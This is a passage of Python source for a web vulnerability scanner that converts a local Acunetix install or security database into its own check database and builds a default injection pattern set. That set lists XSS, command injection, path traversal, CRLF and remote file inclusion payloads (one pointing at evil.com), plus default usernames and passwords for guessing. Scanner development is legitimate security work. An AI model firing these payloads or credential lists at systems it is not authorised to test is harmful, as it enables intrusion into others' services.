    # ── -upac: Extract from local Acunetix install ────────────────────────

    def update_from_acunetix(self, scripts_dir=None):
        """
        -upac: Update vuln database by extracting from locally installed Acunetix.
        Detects version from install, runs extractor, stamps version in DB.
        """
        self._banner("Update DB from Local Acunetix Install")

        # Resolve scripts directory
        if not scripts_dir:
            scripts_dir = self._find_acunetix_scripts()

        if not scripts_dir or not os.path.isdir(scripts_dir):
            self._err(f"Acunetix scripts directory not found: {scripts_dir}")
            self._info("Specify path with: -upac /path/to/Scripts")
            self._info("Or decode scripts first and point to the decoded directory")
            return False

        self._ok(f"Scripts directory: {scripts_dir}")

        # Detect Acunetix version
        acunetix_version = detect_acunetix_version()
        if acunetix_version:
            self._ok(f"Acunetix version: {acunetix_version}")
        else:
            self._warn("Could not auto-detect Acunetix version (v_* dir not found)")
            acunetix_version = "0"

        # Verify it has the expected structure
        expected_dirs = ["Includes", "PerServer", "PerFolder", "XML"]
        missing = [d for d in expected_dirs if not os.path.isdir(os.path.join(scripts_dir, d))]
        if missing:
            self._err(f"Missing expected subdirectories: {', '.join(missing)}")
            return False

        script_count = sum(
            len([f for f in os.listdir(os.path.join(scripts_dir, cat)) if f.endswith('.script')])
            for cat in ["PerFile", "PerFolder", "PerScheme", "PerServer", "PostCrawl", "PostScan", "WebApps", "Network"]
            if os.path.isdir(os.path.join(scripts_dir, cat))
        )
        self._info(f"Found {script_count} check scripts")

        # Run the extractor
        updater_script = os.path.join(SCRIPT_DIR, "updater", "extract_checks.py")
        if not os.path.isfile(updater_script):
            self._err(f"Extractor not found: {updater_script}")
            return False

        self._info("Running extractor...")
        output_path = DEFAULT_DB_PATH
        os.makedirs(os.path.dirname(output_path), exist_ok=True)

        result = subprocess.run(
            [sys.executable, updater_script,
             "--acunetix-scripts-dir", scripts_dir,
             "--output", output_path],
            capture_output=True, text=True
        )

        if result.returncode != 0:
            self._err("Extractor failed:")
            print(result.stderr)
            return False

        # Print extractor output
        for line in result.stdout.strip().split('\n'):
            print(f"    {line}")

        if not os.path.isfile(output_path):
            self._err("Database file was not created")
            return False

        # ── Stamp version + generated timestamp into the DB ──
        generated_ts = datetime.now().strftime("%d%m%y%H%M")  # ddmmyyHHMM

        with open(output_path, encoding='utf-8') as f:
            db = json.load(f)

        db["_meta"]["acunetix_version"] = acunetix_version
        db["_meta"]["generated"] = generated_ts

        # Recalculate checksum with new meta
        content_str = json.dumps(db, sort_keys=True)
        db["_meta"]["checksum"] = hashlib.sha256(content_str.encode()).hexdigest()[:16]

        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(db, f, ensure_ascii=False)

        size_kb = os.path.getsize(output_path) / 1024
        self._ok(f"Database updated: {output_path} ({size_kb:.1f} KB)")

        meta = db.get("_meta", {})
        self._info(f"Version: {meta.get('acunetix_version', '?')}")
        self._info(f"Generated: {meta.get('generated', '?')}")
        total_scripts = sum(len(v) for v in db.get("scripts", {}).values())
        self._info(f"Scripts: {total_scripts}, Vulns: {len(db.get('vuln_db', {}))}")
        self._info(f"Checksum: {meta.get('checksum', '?')}")
        return True

    # ── -cupz: Create portable archive ────────────────────────────────────

    def create_archive(self, archive_path=None):
        """
        -cupz: Create updatedbd_VERSION.tgz archive from current database.
        If no DB exists, automatically runs -upac first.
        """
        self._banner("Create Portable Database Archive")

        db_path = DEFAULT_DB_PATH

        # ── Auto-provision: if no DB exists, run -upac first ──
        if not os.path.isfile(db_path):
            self._warn("No database found — running extraction from Acunetix first...")
            ok = self.update_from_acunetix()
            if not ok:
                self._err("Auto-extraction failed. Cannot create archive.")
                return False

        if not os.path.isfile(db_path):
            self._err(f"No database at: {db_path}")
            return False

        # Load and validate DB
        with open(db_path, encoding='utf-8') as f:
            db = json.load(f)

        meta = db.get("_meta", {})
        acunetix_version = meta.get("acunetix_version", "0")

        # Build archive filename with version
        if not archive_path:
            archive_name = f"{DEFAULT_ARCHIVE_PREFIX}_{acunetix_version}.tgz"
            archive_path = os.path.join(SCRIPT_DIR, archive_name)

        self._info(f"Source database: {db_path}")
        self._info(f"Version: {acunetix_version}")
        self._info(f"Generated: {meta.get('generated', '?')}")
        self._info(f"Checksum: {meta.get('checksum', '?')}")

        total_scripts = sum(len(v) for v in db.get("scripts", {}).values())
        self._info(f"Contents: {total_scripts} scripts, {len(db.get('vuln_db', {}))} vulns")

        # Create archive
        self._info(f"Creating archive: {archive_path}")

        try:
            with tarfile.open(archive_path, "w:gz") as tar:
                # Add the database file
                tar.add(db_path, arcname="checks_db.json")

                # Add a manifest file
                manifest = {
                    "format": "acuscan_vuln_db",
                    "format_version": 2,
                    "scanner_version": VERSION,
                    "created": datetime.now().isoformat(),
                    "created_by": (os.uname().nodename if hasattr(os, "uname") else os.environ.get("COMPUTERNAME", "unknown")),
                    "acunetix_version": acunetix_version,
                    "db_generated": meta.get("generated", "?"),
                    "db_checksum": meta.get("checksum", "?"),
                    "total_scripts": total_scripts,
                    "total_vulns": len(db.get("vuln_db", {})),
                    "server_urls": len(db.get("server_urls", [])),
                    "postcrawl_urls": len(db.get("postcrawl_urls", [])),
                }
                manifest_bytes = json.dumps(manifest, indent=2).encode()

                import io
                info = tarfile.TarInfo(name="manifest.json")
                info.size = len(manifest_bytes)
                info.mtime = time.time()
                tar.addfile(info, io.BytesIO(manifest_bytes))

            archive_size = os.path.getsize(archive_path) / 1024
            self._ok(f"Archive created: {archive_path} ({archive_size:.1f} KB)")
            self._info("Transfer this file to update scanners on other systems")
            self._info(f"Usage: python3 scanner.py -upuz {archive_path}")
            return True

        except Exception as e:
            self._err(f"Failed to create archive: {e}")
            return False

    # ── -upuz: Update from archive ────────────────────────────────────────

    def update_from_archive(self, archive_path=None):
        """
        -upuz: Update scanner database from updatedbd_VERSION.tgz.
        Auto-finds the highest versioned archive if no path given.
        Skips if installed DB is already same or newer version.
        """
        self._banner("Update DB from Archive")

        if not archive_path:
            # Find the best (highest version) archive
            found_path, found_ver = find_best_archive()
            if found_path:
                archive_path = found_path
                self._info(f"Found archive: {os.path.basename(found_path)} (version {found_ver})")
            else:
                self._err(f"No {DEFAULT_ARCHIVE_PREFIX}_*.tgz archive found in current or scanner directory")
                self._info(f"Specify path: -upuz /path/to/{DEFAULT_ARCHIVE_PREFIX}_VERSION.tgz")
                return False

        if not os.path.isfile(archive_path):
            self._err(f"Archive not found: {archive_path}")
            return False

        self._info(f"Archive: {archive_path}")
        archive_size = os.path.getsize(archive_path) / 1024
        self._info(f"Size: {archive_size:.1f} KB")

        try:
            with tarfile.open(archive_path, "r:gz") as tar:
                # Safety check - no path traversal
                for member in tar.getmembers():
                    if member.name.startswith('/') or '..' in member.name:
                        self._err(f"Suspicious path in archive: {member.name}")
                        return False

                names = tar.getnames()
                self._info(f"Archive contents: {', '.join(names)}")

                if "checks_db.json" not in names:
                    self._err("Archive does not contain checks_db.json")
                    return False

                # ── Read archive version from manifest or DB ──
                archive_version = None
                if "manifest.json" in names:
                    mf = tar.extractfile("manifest.json")
                    if mf:
                        manifest = json.loads(mf.read().decode())
                        archive_version = manifest.get("acunetix_version")
                        self._info(f"Archive version: {archive_version}")
                        self._info(f"Created by: {manifest.get('created_by', '?')}")
                        self._info(f"Created: {manifest.get('created', '?')}")
                        self._info(f"Scripts: {manifest.get('total_scripts', '?')}, Vulns: {manifest.get('total_vulns', '?')}")
                        self._info(f"Checksum: {manifest.get('db_checksum', '?')}")

                # If no manifest, try to get version from archive filename
                if not archive_version:
                    fname = os.path.basename(archive_path)
                    m = re.match(r'updatedbd_(\d+)\.tgz$', fname)
                    if m:
                        archive_version = m.group(1)

                # If still no version, read from the DB itself
                if not archive_version:
                    db_file_peek = tar.extractfile("checks_db.json")
                    if db_file_peek:
                        db_peek = json.loads(db_file_peek.read().decode())
                        archive_version = db_peek.get("_meta", {}).get("acunetix_version")

                # ── Version comparison: skip if installed is same or newer ──
                installed_version = get_db_version()
                archive_ver_int = parse_version_int(archive_version)
                installed_ver_int = parse_version_int(installed_version)

                if installed_version and installed_ver_int > 0:
                    self._info(f"Installed DB version: {installed_version}")

                    if installed_ver_int >= archive_ver_int and archive_ver_int > 0:
                        self._warn(f"Installed DB ({installed_version}) is same or newer than archive ({archive_version})")
                        self._info("Skipping update. Use -upac to force re-extraction.")
                        return True  # Not an error — just nothing to do

                    self._ok(f"Upgrading: {installed_version} → {archive_version}")
                else:
                    self._info("No existing DB — installing fresh")

                # ── Backup existing database ──
                db_path = DEFAULT_DB_PATH
                if os.path.isfile(db_path):
                    backup_path = db_path + ".bak"
                    shutil.copy2(db_path, backup_path)
                    self._info(f"Backed up existing DB to: {os.path.basename(backup_path)}")

                # ── Extract checks_db.json ──
                db_file = tar.extractfile("checks_db.json")
                if not db_file:
                    self._err("Failed to read checks_db.json from archive")
                    return False

                db_data = db_file.read()

                # Validate JSON
                db = json.loads(db_data)
                total_scripts = sum(len(v) for v in db.get("scripts", {}).values())
                if total_scripts == 0:
                    self._err("Database appears empty (0 scripts)")
                    return False

                # Write to disk
                os.makedirs(os.path.dirname(db_path), exist_ok=True)
                with open(db_path, 'wb') as f:
                    f.write(db_data)

                size_kb = len(db_data) / 1024
                self._ok(f"Database updated: {db_path} ({size_kb:.1f} KB)")
                self._ok(f"Version: {archive_version}")
                self._ok(f"Loaded {total_scripts} scripts, {len(db.get('vuln_db', {}))} vuln definitions")
                return True

        except tarfile.TarError as e:
            self._err(f"Invalid archive: {e}")
            return False
        except json.JSONDecodeError as e:
            self._err(f"Invalid JSON in archive: {e}")
            return False
        except Exception as e:
            self._err(f"Update failed: {e}")
            traceback.print_exc()
            return False

    # ── -acuconvupdate: Convert Acunetix security .bin to update archive ──

    @staticmethod
    def _parse_protobuf(data):
        """Parse simple protobuf-like binary format from Acunetix vuln chunks."""
        fields = {}
        pos = 0
        while pos < len(data):
            tag = data[pos]
            fnum, wtype = tag >> 3, tag & 0x07
            pos += 1
            if wtype == 0:  # varint
                val, shift = 0, 0
                while pos < len(data):
                    b = data[pos]; pos += 1
                    val |= (b & 0x7f) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fnum] = val
            elif wtype == 2:  # length-delimited
                length, shift = 0, 0
                while pos < len(data):
                    b = data[pos]; pos += 1
                    length |= (b & 0x7f) << shift
                    if not (b & 0x80): break
                    shift += 7
                if pos + length <= len(data):
                    try:
                        fields[fnum] = data[pos:pos+length].decode('utf-8')
                    except UnicodeDecodeError:
                        fields[fnum] = data[pos:pos+length]
                    pos += length
                else:
                    break
            elif wtype == 5:  # 32-bit float
                if pos + 4 <= len(data):
                    fields[fnum] = struct.unpack('<f', data[pos:pos+4])[0]
                    pos += 4
                else:
                    break
            else:
                break
        return fields

    def convert_acunetix_bin(self, bin_path=None):
        """
        -acuconvupdate: Open security_VERSION.bin (SQLite + brotli),
        extract checks/vulns/tech directly, build checks_db.json,
        create updatedbd_VERSION.tgz.

        Works fully autonomous — no decoded scripts or external tools needed.
        Requires: pip install brotli
        """
        self._banner("Convert Acunetix DB to Scanner Update")

        # ── Check brotli ──
        if not HAS_BROTLI:
            self._err("brotli library required:  pip install brotli")
            return False

        # ── Find the .bin file ──
        if not bin_path:
            bin_path = self._find_security_bin()

        if not bin_path or not os.path.isfile(bin_path):
            self._err(f"security_*.bin not found: {bin_path or 'auto-detect failed'}")
            self._info("Usage: -acuconvupdate /path/to/security_NNNNN.bin")
            if IS_WINDOWS:
                self._info(r"Default: C:\ProgramData\Acunetix\shared\security\security_*.bin")
            return False

        self._ok(f"Source: {bin_path}")
        bin_size = os.path.getsize(bin_path) / (1024 * 1024)
        self._info(f"Size: {bin_size:.1f} MB")

        # ── Extract version from filename ──
        fname = os.path.basename(bin_path)
        m = re.match(r'security_(\d+)\.bin$', fname, re.IGNORECASE)
        acunetix_version = m.group(1) if m else "0"
        self._ok(f"Acunetix version: {acunetix_version}")

        # ── Open as SQLite ──
        try:
            conn = sqlite3.connect(bin_path)
            cur = conn.cursor()
            # Quick sanity check
            cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [r[0] for r in cur.fetchall()]
            required = {'chunk', 'file', 'vuln', 'meta'}
            if not required.issubset(set(tables)):
                self._err(f"Not a valid Acunetix security DB. Tables: {tables}")
                conn.close()
                return False
            self._ok(f"SQLite OK — tables: {', '.join(sorted(tables))}")
        except Exception as e:
            self._err(f"Cannot open as SQLite: {e}")
            return False

        try:
            # ── Read metadata ──
            cur.execute("SELECT key, value FROM meta")
            meta_raw = dict(cur.fetchall())
            self._info(f"DB version: {meta_raw.get('version', '?')}  release: {meta_raw.get('release', '?')}")

            # ── Row counts ──
            counts = {}
            for t in ['chunk', 'vuln', 'tech', 'file', 'fp']:
                if t in tables:
                    cur.execute(f"SELECT count(*) FROM {t}")
                    counts[t] = cur.fetchone()[0]
            self._info(f"Chunks: {counts.get('chunk',0)}  Vulns: {counts.get('vuln',0)}  Tech: {counts.get('tech',0)}  FP: {counts.get('fp',0)}")

            # ═══ Phase 1: Extract checks.json ═══
            self._info("")
            self._info("Phase 1: Extracting check structure from checks.json...")
            cur.execute("SELECT data FROM file WHERE name = 'checks.json'")
            row = cur.fetchone()
            if not row:
                self._err("checks.json not found in file table")
                conn.close()
                return False

            chunk_id = row[0]
            cur.execute("SELECT data FROM chunk WHERE chunk = ?", (chunk_id,))
            chunk_row = cur.fetchone()
            if not chunk_row:
                self._err(f"Chunk {chunk_id} not found")
                conn.close()
                return False

            checks_raw = brotli.decompress(chunk_row[0])
            checks_data = json.loads(checks_raw.decode('utf-8'))
            self._ok(f"checks.json decompressed: {len(checks_raw)/1024:.1f} KB")

            # Parse the check tree
            top_checks = checks_data.get('checks', [])

            # Category mapping
            SCRIPT_CATEGORIES = ['PerFile', 'PerFolder', 'PerScheme', 'PerServer',
                                 'PostCrawl', 'PostScan', 'WebApps', 'Network']

            scripts_db = {cat: [] for cat in SCRIPT_CATEGORIES}
            server_urls = []
            postcrawl_urls = []
            sensitive_files = []
            sensitive_dirs = []
            webapp_patterns = {}

            # Known check-type to URL-category mapping from the bin structure
            # Scripts group: PerFile, PerFolder, PerScheme, PerServer, PostCrawl, PostScan, WebApps
            # Other groups: RPA, Crawler, location, httpdata, target, input_group, deepscan, api_operation

            # Map bin group keys to our scanner categories
            BIN_TO_CATEGORY = {
                'PerFile': 'PerFile', 'PerFolder': 'PerFolder', 'PerScheme': 'PerScheme',
                'PerServer': 'PerServer', 'PostCrawl': 'PostCrawl', 'PostScan': 'PostScan',
                'WebApps': 'WebApps',
                # Non-Scripts groups map to nearest scanner category
                'target': 'PerServer',
                'location': 'PerServer',
                'httpdata': 'PostCrawl',
                'RPA': 'PostCrawl',
                'Crawler': 'PostCrawl',
                'input_group': 'PerScheme',
                'deepscan': 'PerScheme',
                'api_operation': 'PerScheme',
                'Network': 'Network',
            }

            total_scripts = 0
            for group in top_checks:
                gkey = group.get('key', '')
                gsubs = group.get('checks') or []

                if gkey == 'Scripts':
                    # This is the main Scripts group with sub-categories
                    for cat_group in gsubs:
                        cat_key = cat_group.get('key', '')
                        if cat_key not in scripts_db:
                            scripts_db[cat_key] = []
                        cat_scripts = cat_group.get('checks') or []
                        for sc in cat_scripts:
                            sname = sc.get('key', '')
                            stitle = sc.get('title', sname)
                            sdesc = sc.get('description', '')
                            if not sname:
                                continue
                            clean_name = sname.replace('.script', '').replace('.js', '')
                            entry = {
                                "name": clean_name,
                                "category": cat_key,
                                "file": sname,
                                "title": stitle,
                                "description": (sdesc or '')[:300],
                                "urls": [],
                                "vuln_refs": [],
                                "methods": [],
                                "headers": [],
                                "payloads": [],
                            }
                            scripts_db[cat_key].append(entry)
                            total_scripts += 1
                else:
                    # Non-Scripts groups (target, location, httpdata, etc.)
                    mapped_cat = BIN_TO_CATEGORY.get(gkey, 'PerServer')
                    if mapped_cat not in scripts_db:
                        scripts_db[mapped_cat] = []
                    self._flatten_check_group(gsubs, gkey, mapped_cat, scripts_db,
                                              server_urls, postcrawl_urls, webapp_patterns)
                    total_scripts += sum(1 for s in gsubs if s.get('key'))

            for cat, slist in scripts_db.items():
                self._ok(f"  {cat}: {len(slist)} checks")

            # ═══ Phase 2: Extract vulnerability definitions ═══
            self._info("")
            self._info("Phase 2: Extracting vulnerability definitions...")

            SEVERITY_MAP = {1: 'info', 2: 'low', 3: 'medium', 4: 'high', 5: 'critical'}
            vuln_db = {}
            vuln_count = 0

            cur.execute("""
                SELECT v.vuln, v.path, v.score, c.data
                FROM vuln v JOIN chunk c ON v.data = c.chunk
            """)

            for vid, vpath, vscore, cdata in cur.fetchall():
                try:
                    dec = brotli.decompress(cdata)
                    f = self._parse_protobuf(dec)
                except Exception:
                    continue

                # Derive a clean ref key from the path
                # e.g. "db/vulnerabilities/acx/2004/ASP.NET_application_trace.yaml"
                ref_key = os.path.basename(vpath or vid)
                if ref_key.endswith('.yaml'):
                    ref_key = ref_key[:-5]
                # Also create .xml variant for compat with old extractor
                xml_key = ref_key + '.xml'

                sev_int = f.get(4, 0)
                entry = {
                    "name": f.get(3, ref_key),
                    "severity": SEVERITY_MAP.get(sev_int, 'info'),
                    "cvss_score": str(round(f.get(5, 0), 1)),
                    "cvss3": f.get(12, ''),
                    "cvss2": f.get(11, ''),
                    "description": (f.get(8, '') or '')[:500],
                    "impact": (f.get(7, '') or '')[:300],
                    "remediation": (f.get(9, '') or '')[:300],
                    "highlight": f.get(6, ''),
                    "id": vid,
                    "path": vpath,
                }

                # Extract CWE/CVE from path or description
                cve_match = re.search(r'(CVE-\d{4}-\d+)', str(vpath) + ' ' + str(f.get(8, '')))
                if cve_match:
                    entry["cve"] = cve_match.group(1)

                cwe_match = re.search(r'(CWE-\d+)', str(f.get(8, '')) + ' ' + str(f.get(7, '')))
                if cwe_match:
                    entry["cwe"] = cwe_match.group(1)

                vuln_db[ref_key] = entry
                vuln_db[xml_key] = entry  # compat alias
                vuln_count += 1

            self._ok(f"  {vuln_count} vulnerability definitions extracted")

            # ═══ Phase 3: Extract technology fingerprints ═══
            self._info("")
            self._info("Phase 3: Extracting technology fingerprints...")

            tech_count = 0
            tech_info = {}  # tech_id -> {name, type, version}
            if 'tech' in tables:
                cur.execute("""
                    SELECT t.tech, t.type, c.data
                    FROM tech t JOIN chunk c ON t.data = c.chunk
                """)
                for tid, ttype, cdata in cur.fetchall():
                    try:
                        dec = brotli.decompress(cdata)
                        f = self._parse_protobuf(dec)
                        tech_info[tid] = {
                            "name": f.get(2, tid),
                            "type": ttype or f.get(4, ''),
                            "version": f.get(7, ''),
                        }
                        tech_count += 1
                    except Exception:
                        continue

            self._ok(f"  {tech_count} technology entries parsed")

            # ═══ Phase 3b: Build webapp patterns from FP table ═══
            if 'fp' in tables:
                cur.execute("SELECT tech, path FROM fp WHERE path IS NOT NULL")
                fp_by_tech = {}
                for ftech, fpath in cur.fetchall():
                    if fpath and fpath.startswith('/'):
                        fp_by_tech.setdefault(ftech, []).append(fpath)
                # Build webapp patterns: tech -> [detection paths]
                for tid, paths in fp_by_tech.items():
                    if len(paths) >= 1:
                        safe_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', str(tid))
                        webapp_patterns[safe_id] = list(set(paths))
                self._ok(f"  {len(webapp_patterns)} webapp fingerprint patterns from {sum(len(v) for v in fp_by_tech.values())} FP entries")

            # ═══ Phase 4: Consolidate URL lists ═══
            self._info("")
            self._info("Phase 4: Building URL lists...")

            # Add all FP paths as server URLs (for fingerprint detection)
            if 'fp' in tables:
                cur.execute("SELECT DISTINCT path FROM fp WHERE path IS NOT NULL AND path LIKE '/%'")
                for (fpath,) in cur.fetchall():
                    if fpath not in server_urls:
                        server_urls.append(fpath)

            # Derive postcrawl URLs from PostCrawl script names
            for sc in scripts_db.get('PostCrawl', []):
                sname = sc.get('name', '')
                # Many PostCrawl scripts check specific paths
                # The actual paths are in the script logic, not extractable from metadata alone

            self._ok(f"  Server URLs: {len(server_urls)}")
            self._ok(f"  PostCrawl URLs: {len(postcrawl_urls)}")
            self._ok(f"  WebApp patterns: {len(webapp_patterns)}")

            conn.close()

            # ═══ Phase 5: Build injection patterns (standard set) ═══
            self._info("")
            self._info("Phase 5: Building standard injection patterns...")

            injection_patterns = self._build_default_injection_patterns()

            # ═══ Phase 6: Assemble and write checks_db.json ═══
            self._info("")
            self._info("Phase 6: Assembling database...")

            generated_ts = datetime.now().strftime("%d%m%y%H%M")
            db = {
                "_meta": {
                    "version": "2.0",
                    "generator": "AcuScan Acunetix Bin Converter",
                    "generated_at": datetime.now().isoformat(),
                    "source": os.path.basename(bin_path),
                    "acunetix_release": meta_raw.get('release', '?'),
                    "stats": {
                        "total_scripts": total_scripts,
                        "vuln_definitions": vuln_count,
                        "tech_entries": tech_count,
                        "server_urls": len(server_urls),
                        "postcrawl_urls": len(postcrawl_urls),
                        "webapp_patterns": len(webapp_patterns),
                    },
                    "acunetix_version": acunetix_version,
                    "generated": generated_ts,
                },
                "injection_patterns": injection_patterns,
                "scripts": scripts_db,
                "vuln_db": vuln_db,
                "server_urls": server_urls,
                "postcrawl_urls": postcrawl_urls,
                "sensitive_files": sensitive_files,
                "sensitive_dirs": sensitive_dirs,
                "webapp_patterns": webapp_patterns,
            }

            # Compute checksum
            content_str = json.dumps(db, sort_keys=True)
            db["_meta"]["checksum"] = hashlib.sha256(content_str.encode()).hexdigest()[:16]

            output_path = DEFAULT_DB_PATH
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(db, f, ensure_ascii=False)

            size_kb = os.path.getsize(output_path) / 1024
            self._ok(f"Database: {output_path} ({size_kb:.1f} KB)")

            # ═══ Phase 7: Create versioned archive ═══
            self._info("")
            archive_name = f"{DEFAULT_ARCHIVE_PREFIX}_{acunetix_version}.tgz"
            archive_path = os.path.join(SCRIPT_DIR, archive_name)
            self.create_archive(archive_path)

            # ═══ Summary ═══
            print()
            self._ok(f"Done! Acunetix {meta_raw.get('release', '?')} (build {acunetix_version})")
            self._info(f"Database: {output_path} ({size_kb:.1f} KB)")
            self._info(f"Archive:  {archive_path}")
            self._info(f"Scripts:  {total_scripts}")
            self._info(f"Vulns:    {vuln_count}")
            self._info(f"Tech:     {tech_count}  WebApp patterns: {len(webapp_patterns)}")
            self._info(f"URLs:     {len(server_urls)} server + {len(postcrawl_urls)} postcrawl")
            return True

        except Exception as e:
            self._err(f"Conversion failed: {e}")
            traceback.print_exc()
            try:
                conn.close()
            except Exception:
                pass
            return False

    def _flatten_check_group(self, checks, group_key, mapped_cat, scripts_db,
                              server_urls, postcrawl_urls, webapp_patterns):
        """Recursively flatten a check group from the bin's checks.json."""
        for item in checks:
            if not isinstance(item, dict):
                continue
            key = item.get('key', '')
            title = item.get('title', key)
            desc = item.get('description', '')
            subs = item.get('checks')

            if subs:
                # Recurse into nested groups
                self._flatten_check_group(subs, group_key, mapped_cat, scripts_db,
                                          server_urls, postcrawl_urls, webapp_patterns)
            elif key:
                clean_name = key.replace('.script', '').replace('.js', '')
                entry = {
                    "name": clean_name,
                    "category": mapped_cat,
                    "file": key,
                    "title": title,
                    "description": (desc or '')[:300],
                    "urls": [],
                    "vuln_refs": [],
                    "methods": [],
                    "headers": [],
                    "payloads": [],
                    "source_group": group_key,
                }
                scripts_db[mapped_cat].append(entry)

                # Derive URLs from check names for target/location groups
                if group_key in ('target', 'location'):
                    # These checks typically probe specific server paths
                    pass  # URLs come from the actual check logic, not the name

    def _build_default_injection_patterns(self):
        """Build standard injection pattern set for the scanner.
        Format matches what _compile_patterns() expects:
          - 'plain': list of strings
          - 'regex': list of {"pattern": str, "flags": str}
        """
        def R(patterns):
            """Convert list of regex strings to list of {pattern, flags} dicts."""
            return [{"pattern": p, "flags": ""} for p in patterns]

        return {
            "sql_injection": {
                "plain": [
                    "Microsoft OLE DB Provider for ODBC Drivers",
                    "Microsoft OLE DB Provider for SQL Server",
                    "Error Executing Database Query",
                    "Unclosed quotation mark",
                    "ADODB.Field error",
                    "BOF or EOF",
                    "ADODB.Command",
                    "JET Database Engine",
                    "mysql_fetch_array()",
                    "mysql_num_rows()",
                    "mysql_connect()",
                    "You have an error in your SQL syntax",
                    "supplied argument is not a valid MySQL",
                    "pg_connect()",
                    "pg_query()",
                    "pg_exec()",
                    "unterminated quoted string",
                    "invalid input syntax for",
                    "SQLServer JDBC Driver",
                    "com.microsoft.sqlserver",
                    "Incorrect syntax near",
                    "quoted string not properly terminated",
                    "Oracle.*Driver",
                    "ORA-01756",
                    "ORA-00933",
                    "ORA-06512",
                    "SQLite3::",
                    "System.Data.SQLite",
                    "SQLSTATE[",
                    "Dynamic SQL Error",
                    "CLI Driver.*DB2",
                    "com.mysql.jdbc",
                    "Syntax error.*in query",
                    "1ACUSTART'ACUEND",
                    "1 AND 1=1",
                    "1' AND '1'='1",
                ],
                "regex": R([
                    r"(Incorrect\s+syntax\s+near\s+'[^']*')",
                    r"SQL syntax.*MySQL",
                    r"ORA-\d{5}",
                    r"PostgreSQL.*ERROR",
                    r"Warning.*pg_",
                    r"SQLSTATE\[\w+\]",
                    r"Syntax error.*in query",
                    r"mysql_fetch",
                    r"mysql_num_rows",
                    r"You have an error in your SQL",
                    r"supplied argument is not a valid MySQL",
                    r"pg_query\(\)",
                    r"pg_exec\(\)",
                    r"com\.microsoft\.sqlserver",
                    r"Unclosed quotation mark after the character string",
                    r"quoted string not properly terminated",
                    r"Dynamic SQL Error",
                    r"Firebird.*error",
                    r"Syntax error: Missing operand",
                    r"com\.mysql\.jdbc",
                ]),
            },
            "xss": {
                "tags": [
                    '<script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '\'"><script>alert(1)</script>',
                    "'-alert(1)-'",
                    '<body onload=alert(1)>',
                    '<input onfocus=alert(1) autofocus>',
                    '<details open ontoggle=alert(1)>',
                    '<iframe src="javascript:alert(1)">',
                    '{{7*7}}',
                    '${7*7}',
                    '<a href="javascript:alert(1)">click</a>',
                    '<marquee onstart=alert(1)>',
                    'javascript:alert(1)//',
                    '\'"><img src=x onerror=alert(1)>',
                ],
                "event_handlers": [
                    "onload", "onerror", "onclick", "onmouseover",
                    "onfocus", "onblur", "onkeyup", "ontoggle",
                ],
                "markers": ["acunetix_xss_test", "acuscan_xss"],
            },
            "code_execution": {
                "payloads": [
                    ";id", "|id", "$(id)", "`id`", "\nid",
                    ";cat /etc/passwd", "|cat /etc/passwd",
                    "$(cat /etc/passwd)", "&& cat /etc/passwd",
                ],
                "regex": R([
                    r"uid=\d+\(", r"root:x:0:0:", r"root:.*:0:0:",
                    r"Linux.*\d+\.\d+\.\d+", r"Windows.*\d+\.\d+",
                    r"COMPUTERNAME=", r"SystemRoot=",
                    r"\[boot loader\]", r"\[operating systems\]",
                    r"HOMEDRIVE=",
                ]),
            },
            "directory_traversal": {
                "plain": [
                    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/passwd",
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "/etc/passwd%00",
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "..%c0%af..%c0%af..%c0%afetc/passwd",
                    "....//....//....//....//etc/passwd",
                ],
                "regex": R([
                    r"root:x:0:0:", r"\[extensions\]", r"\[boot loader\]",
                    r"root:.*:0:0:", r"\[fonts\]",
                    r"(root|bin|daemon|sys|sync|games|man|mail|news|www-data):[\d\w-\s,]+:\d+:\d+",
                ]),
            },
            "file_inclusion": {
                "plain": [
                    "http://evil.com/shell.txt", "//evil.com/shell.txt",
                    "php://input", "php://filter/convert.base64-encode/resource=index.php",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                    "expect://id", "file:///etc/passwd",
                ],
                "regex": R([
                    r"root:x:0:0:", r"<\?php", r"phpinfo\(\)",
                    r"PHP Version", r"allow_url_fopen",
                    r"Failed opening required", r"failed to open stream",
                ]),
            },
            "crlf_injection": {
                "payloads": [
                    "%0d%0aSet-Cookie:crlf=injection",
                    "%0aSet-Cookie:crlf=injection",
                    "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
                ],
            },
            "error_messages": {
                "plain": [
                    "Fatal error:", "Parse error:", "Warning:",
                    "Notice:", "Stack trace:", "Traceback (most recent",
                    "Exception in thread", "Microsoft OLE DB Provider",
                    "ADODB.Field error", "Unhandled Exception",
                    "Server Error in",
                ],
                "regex": R([
                    r"on line \d+", r"at \w+\.\w+\(",
                    r"java\.\w+\.Exception",
                    r"<b>Warning</b>:.*<b>",
                    r"<b>Fatal error</b>:.*<b>",
                    r"mysql_fetch_array\(\)", r"mysql_num_rows\(\)",
                    r"pg_connect\(\)", r"pg_query\(\)",
                    r"ora_logon\(\)", r"sqlite_open\(\)",
                    r"mssql_query\(\)", r"sybase_connect\(\)",
                ]),
            },
            "dir_listing": {
                "patterns": [
                    "Index of /", "Parent Directory",
                    "[To Parent Directory]",
                    "Directory Listing For",
                ],
            },
            "credentials": {
                "usernames": [
                    "admin", "administrator", "root", "test", "guest",
                    "user", "demo", "manager", "operator", "webmaster",
                    "tomcat", "postgres", "mysql", "oracle", "sa", "ftp",
                ],
                "passwords": [
                    "admin", "password", "123456", "12345678", "test",
                    "guest", "root", "toor", "pass", "changeme",
                    "default", "master", "letmein", "qwerty", "welcome",
                    "password1", "admin123", "P@ssw0rd", "p@ssw0rd",
                    "123qwe", "000000", "shadow", "654321",
                    "secret", "1q2w3e4r", "admin@123",
                ],
            },
            "backup_variants": [
                "${fileName}${fileExt}.bak",
                "${fileName}${fileExt}.backup",
                "${fileName}${fileExt}.old",
                "${fileName}${fileExt}.orig",
                "${fileName}${fileExt}.save",
                "${fileName}${fileExt}.swp",
